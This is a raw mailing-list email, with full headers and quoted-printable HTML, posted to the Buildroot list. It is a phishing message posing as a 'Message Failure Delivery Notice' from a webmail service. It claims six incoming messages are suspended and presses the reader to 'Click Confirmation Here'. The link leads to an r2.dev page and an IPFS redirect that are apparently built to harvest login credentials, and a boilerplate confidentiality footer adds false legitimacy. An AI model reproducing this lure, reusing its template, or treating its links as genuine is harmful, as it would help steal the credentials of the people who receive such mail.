Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 9D485C3DA49
	for <buildroot@archiver.kernel.org>; Fri, 26 Jul 2024 18:58:24 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 0E22940D73;
	Fri, 26 Jul 2024 18:58:24 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id iuG5_bQObxEk; Fri, 26 Jul 2024 18:58:22 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org A2E1F40D9F
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp4.osuosl.org (Postfix) with ESMTP id A2E1F40D9F;
	Fri, 26 Jul 2024 18:58:22 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 708281BF85D
 for <buildroot@lists.busybox.net>; Fri, 26 Jul 2024 18:58:21 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 2AB118209C
 for <buildroot@lists.busybox.net>; Fri, 26 Jul 2024 18:58:18 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id kGSKrbJb73fF for <buildroot@lists.busybox.net>;
 Fri, 26 Jul 2024 18:58:16 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.217.243;
 helo=busybox.net; envelope-from=notification@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org B5C76820A9
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B5C76820A9
Received: from busybox.net (unknown [192.227.217.243])
 by smtp1.osuosl.org (Postfix) with ESMTP id B5C76820A9
 for <buildroot@busybox.net>; Fri, 26 Jul 2024 18:58:15 +0000 (UTC)
From: Webmail<notification@busybox.net>
To: buildroot@busybox.net
Date: 26 Jul 2024 20:58:15 +0200
Message-ID: <20240726205814.7EF434DA0BF7B727@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Message Failure
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============9188887691898158161=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>


--===============9188887691898158161==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0012_38B66783.4D140655"


------=_NextPart_000_0012_38B66783.4D140655
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Dear, buildroot
------=_NextPart_000_0012_38B66783.4D140655
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.18639">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"548" style=3D"text-align: justify; color: black; text-trans=
form: none; letter-spacing: normal; padding-top: 0px; padding-bottom: 0px; =
font-family: Arial, Helvetica, sans-serif; font-size: 15px; font-style: nor=
mal; font-weight: 400; word-spacing: 0px; white-space: normal; border-colla=
pse: collapse; max-width: 548px; border-spacing: 0px; orphans: 2; widows: 2=
; font-stretch: inherit; background-color: rgb(244, 248, 245); font-variant=
-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;" cellspacing=3D"0"=
 cellpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding-right: 0px;=
 padding-bottom: 15px; padding-left: 0px; font-family: "Google Sans", Robot=
o, RobotoDraft, Helvetica, Arial, sans-serif; border-spacing: 0px;'>
<table style=3D"padding-top: 0px; padding-bottom: 0px; font-family: inherit=
; font-weight: 600; border-collapse: collapse; max-width: 548px; border-spa=
cing: 0px; font-stretch: inherit;"><tbody><tr><td style=3D'margin: 0px; wid=
th: 181px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-a=
lign: bottom;'></td><td style=3D'margin: 0px; width: 186px; text-align: cen=
ter; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-align: =
bottom;'></td>
<td style=3D'margin: 0px; width: 181px; text-align: right; font-family: "Se=
goe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'></td></tr><t=
r><td style=3D'margin: 0px; width: 181px; padding-top: 0px; padding-bottom:=
 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px=
; font-weight: 400; vertical-align: middle;'><font color=3D"white"><span st=
yle=3D"border-width: 0px; margin: 0px; padding: 0px; color: black; vertical=
-align: baseline;">Sender</span></font></td>
<td style=3D'margin: 0px; width: 186px; text-align: center; padding-top: 0p=
x; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-seri=
f; font-size: 14px; font-weight: 400; vertical-align: middle;'></td><td sty=
le=3D'margin: 0px; width: 181px; text-align: right; padding-top: 0px; paddi=
ng-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-=
size: 14px; font-weight: 400; vertical-align: middle;'><font color=3D"white=
">
<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(192=
, 0, 0); vertical-align: baseline;"><b>Action Required</b></span></font></t=
d></tr><tr><td style=3D"margin: 0px; padding: 0px;" colspan=3D"3"><table st=
yle=3D"padding: 0px; border-collapse: collapse; border-spacing: 0px;" cells=
pacing=3D"0" cellpadding=3D"0"><tbody><tr height=3D"10"><td style=3D"margin=
: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-si=
ze: 6px;" bgcolor=3D"#cccccc"></td>
<td style=3D"margin: 0px; padding: 0px; width: 4px; height: 10px; line-heig=
ht: 10px; font-size: 6px;" bgcolor=3D"white"></td><td style=3D"margin: 0px;=
 padding: 0px; width: 180px; height: 10px; line-height: 10px; font-size: 6p=
x;" bgcolor=3D"#cccccc"></td><td style=3D"margin: 0px; padding: 0px; width:=
 4px; height: 10px; line-height: 10px; font-size: 6px;" bgcolor=3D"white"><=
/td><td style=3D"margin: 0px; padding: 0px; width: 180px; height: 10px; lin=
e-height: 10px; font-size: 6px;" bgcolor=3D"#c00000"></td></tr>
</tbody></table></td></tr><tr><td style=3D'margin: 0px; padding: 0px; width=
: 181px; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-=
serif; font-size: 14px; font-weight: 400;'></td><td style=3D'margin: 0px; p=
adding: 0px; width: 186px; text-align: center; line-height: 20px; font-fami=
ly: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-weight: =
400;'></td>
<td style=3D'margin: 0px; padding: 0px; width: 181px; text-align: right; li=
ne-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font=
-size: 14px; font-weight: 400;'><font color=3D"white"><span style=3D"border=
-width: 0px; margin: 0px; padding: 0px; color: rgb(192, 0, 0); vertical-ali=
gn: baseline;">Messages suspended</span></font></td></tr></tbody></table></=
td></tr><tr>
<td style=3D'margin: 0px; width: 528px; padding-top: 0px; padding-right: 10=
px; padding-left: 10px; font-family: "Google Sans", Roboto, RobotoDraft, He=
lvetica, Arial, sans-serif;'><br><table style=3D"padding: 0px; width: 528px=
; margin-left: 0px; background-color: rgb(242, 245, 250);"><tbody><tr><td s=
tyle=3D'margin: 0px; padding: 0px 10px; font-family: "Segoe UI", Frutiger, =
Arial, sans-serif; font-size: 21px;'>
<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
ont-stretch: inherit;"><b>Message Failure Delivery Notice.</b></div><div st=
yle=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, 31, 30)=
; font-family: inherit; font-size: 15px; vertical-align: baseline; font-str=
etch: inherit;">User:&nbsp;<font color=3D"#1d37e2">buildroot@busybox.net</f=
ont></div>
<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
ont-stretch: inherit;"></div></td></tr><tr><td style=3D'margin: 0px; paddin=
g: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font=
-size: 16px;'>You have (6) Suspended incoming messages<br><br>Please Fix It=
 Below<br><br>
<a style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(17, 85=
, 204); text-decoration: none !important; vertical-align: baseline;" href=
=3D"https://pub-d44b064a84c44f84af7d028c687ac49e.r2.dev/CHAMELEO.html#build=
root@busybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.goo=
gle.com/url?q=3Dhttps://ipfs.fleek.co/ipfs/Qmdj6UHg5hq9h9RZ93sHSUKtRWgF4VEY=
L48zTZjA5DJ2Et?%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16733411=
61536000&amp;usg=3DAOvVaw1vug0ZlZdLS4q24RM_dEI1"><b>
Click Confirmation Here</b></a><span>&nbsp;</span>&nbsp;To View Incoming Su=
spended Messages And Retrieve Them.<br></td></tr><tr><td style=3D'margin: 0=
px; padding: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-s=
erif; font-size: 16px;'></td></tr></tbody>
</table></td></tr><tr><td style=3D'margin: 0px; padding-top: 10px; padding-=
bottom: 4px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-siz=
e: 14px;'><br><br><br><br><br><br></td></tr></tbody></table>
<font color=3D"#999999" style=3D"text-align: justify; text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, s=
ans-serif; font-size: small; font-style: normal; font-weight: 400; word-spa=
cing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rg=
b(244, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color:=20
initial;">
The information contained in or attached to this communication is intended =
solely for the use of the individual or entity to whom it is addressed and =
others authorized to receive it. It may contain confidential or legally pri=
vileged information. If you are not the intended recipient you are hereby n=
otified that any disclosure, copying, distribution or taking any action in =
reliance on the contents of this information is strictly prohibited and may=
 be unlawful. If you have received this=20
communication in error, please notify me immediately by responding to this =
email and then delete it from your system. We are neither liable for the pr=
oper and complete transmission of the information contained in this communi=
cation nor for any delay in its receipt.</font></body></html>
------=_NextPart_000_0012_38B66783.4D140655--

--===============9188887691898158161==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============9188887691898158161==--
